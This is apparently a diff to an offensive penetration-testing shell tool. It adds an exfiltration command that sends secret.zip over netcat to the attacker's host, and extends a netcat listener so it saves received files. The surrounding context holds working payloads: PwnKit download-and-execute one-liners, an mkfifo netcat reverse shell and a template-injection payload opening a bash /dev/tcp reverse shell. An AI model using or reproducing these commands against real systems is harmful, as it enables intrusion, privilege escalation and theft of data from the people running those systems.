@@ -5075,6 +5075,7 @@ class LazyOwnShell(Cmd):
             ("pwnkit", f"curl -o PwnKit http://{lhost}/PwnKit ; chmod +x ./PwnKit ; ./PwnKit"),
             ("pwnkit", f"curl -o PwnKit http://{lhost}/PwnKit32 ; chmod +x ./PwnKit ; ./PwnKit"),
             ("Reverse Shell",f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc {lhost} {lport} >/tmp/f"),
+            ("Get secret",f"nc -w 3 {lhost} {lport} < secret.zip"),
             ("SqlPAD Inyection","""{{ process.mainModule.require('child_process').exec('/bin/bash -c \\'bash -i >& /dev/tcp/{lhost}/5555 0>&1\\'') }}""".replace("{lhost}", lhost)),
             ("locate httpd.conf files", "locate httpd.conf"),
             ("locate vhosts.conf files", "locate vhosts.conf"),
@@ -13035,11 +13036,33 @@ class LazyOwnShell(Cmd):
             )
             return
         if not line:
-            print_msg(f"Try.. sudo nc -lvnp {lport}{RESET}")
-            os.system(f"sudo nc -lvnp {lport}")
+                if int(lport) < 1024:
+                    print_msg(f"Try.. sudo nc -lvnp {lport}{RESET}")
+                    os.system(f"sudo nc -lvnp {lport}")
+                else:
+                    print_msg(f"Try.. nc -lvnp {lport}{RESET}")
+                    os.system(f"nc -lvnp {lport}")
         else:
-            print_msg(f"Try.. sudo nc -lvnp {line}{RESET}")
-            os.system(f"sudo nc -lvnp {line}")
+            if line.startswith("file"):
+                args = line.split(" ")
+                if len(args) == 2:
+                    filename = args[1]
+                    command = f"nc -lp {lport} > sessions/{filename}"
+                    print_msg(command)
+                    os.system(command)
+                    
+                else:
+                    command = f"nc -lp {lport} > sessions/secret.zip"
+                    print_msg(command)
+                    os.system(command)
+                    
+            else:
+                if int(line) < 1024:
+                    print_msg(f"Try.. sudo nc -lvnp {line}{RESET}")
+                    os.system(f"sudo nc -lvnp {line}")
+                else:
+                    print_msg(f"Try.. nc -lvnp {line}{RESET}")
+                    os.system(f"nc -lvnp {line}")
         print_msg(
             f"{RED}[*] {YELLOW} Shutdown nc sessions in port {RED} [{lport}|{line}] {RESET}"
         )
